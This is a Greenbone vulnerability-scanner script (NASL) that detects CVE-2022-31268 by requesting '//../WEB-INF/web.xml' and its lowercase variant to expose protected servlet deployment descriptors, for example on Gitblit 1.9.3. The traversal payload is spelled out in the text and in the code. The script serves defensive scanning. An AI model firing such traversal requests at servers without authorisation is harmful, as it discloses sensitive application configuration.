# Copyright (C) 2022 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.104266");
  script_version("2022-08-04T13:37:02+0000");
  script_cve_id("CVE-2022-31268");
  script_tag(name:"last_modification", value:"2022-08-04 13:37:02 +0000 (Thu, 04 Aug 2022)");
  script_tag(name:"creation_date", value:"2022-08-03 13:32:26 +0000 (Wed, 03 Aug 2022)");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2022-06-02 18:24:00 +0000 (Thu, 02 Jun 2022)");
  script_name("'/../WEB-INF/' Information Disclosure Vulnerability (HTTP)");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2022 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 8080);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"https://github.com/metaStor/Vuls/blob/main/gitblit/gitblit%20V1.9.3%20path%20traversal/gitblit%20V1.9.3%20path%20traversal.md");

  script_tag(name:"summary", value:"Various application or web servers / products are prone to an
  information disclosure vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"affected", value:"The following products are known to be affected:

  - Gitblit version 1.9.3 and probably prior

  Other products might be affected as well.");

  script_tag(name:"insight", value:"The servlet specification prohibits servlet containers from
  serving resources in the '/WEB-INF' and '/META-INF' directories of a web application archive
  directly to clients.

  This means that URLs like:

  http://example.com/WEB-INF/web.xml

  will return an error message, rather than the contents of the deployment descriptor.

  However, some application or web servers / products are prone to a vulnerability that exposes this
  information if the client requests a URL like this instead:

  http://example.com//../WEB-INF/web.xml

  http://example.com//../web-inf/web.xml

  (note the ('/../') before 'WEB-INF').");

  script_tag(name:"impact", value:"Based on the information provided in this file an attacker might
  be able to gather additional info and / or sensitive data about the application / the application
  / web server.");

  script_tag(name:"solution", value:"Please contact the vendor for information on a possible fix.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

base_pattern  = "^\s*<(web-app( .+|>$)|servlet>$)";
extra_pattern = "^\s*</(web-app|servlet)>$";

port = http_get_port( default:8080 );

foreach dir( make_list_unique( "/",
                               "/resources", # Gitblit
                               http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" )
    dir = "";

  url = dir + "/WEB-INF/web.xml";
  res = http_get_cache( item:url, port:port );

  # nb: Avoid excessive reporting if the file is directly accessible (already checked by
  # 2018/gb_sensitive_file_disclosures_http.nasl and 2021/gb_web-inf_plain_info_disclosure.nasl).
  if( res &&
      egrep( string:res, pattern:base_pattern, icase:FALSE ) &&
      egrep( string:res, pattern:extra_pattern, icase:FALSE ) )
    continue;

  url = str_replace( string:url, find:"/WEB-INF/web.xml", replace:"//../WEB-INF/web.xml" );

  req = http_get( item:url, port:port );
  res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );

  if( res &&
      egrep( string:res, pattern:base_pattern, icase:FALSE ) &&
      egrep( string:res, pattern:extra_pattern, icase:FALSE ) ) {
    report  = http_report_vuln_url( port:port, url:url );
    report += '\nResponse (truncated):\n\n' + substr( res, 0, 1500 );
    security_message( port:port, data:report );
    exit( 0 );
  }

  # nb: We also want to check the lowercase variant (See e.g. CVE-2016-0793 of /pre2008/generic_WEB-INF.nasl).
  url = str_replace( string:url, find:"//../WEB-INF/web.xml", replace:"//../web-inf/web.xml" );

  req = http_get( item:url, port:port );
  res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );
  if( ! res )
    continue;

  if( egrep( string:res, pattern:base_pattern, icase:FALSE ) &&
      egrep( string:res, pattern:extra_pattern, icase:FALSE ) ) {
    report  = http_report_vuln_url( port:port, url:url );
    report += '\nResponse (truncated):\n\n' + substr( res, 0, 1500 );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
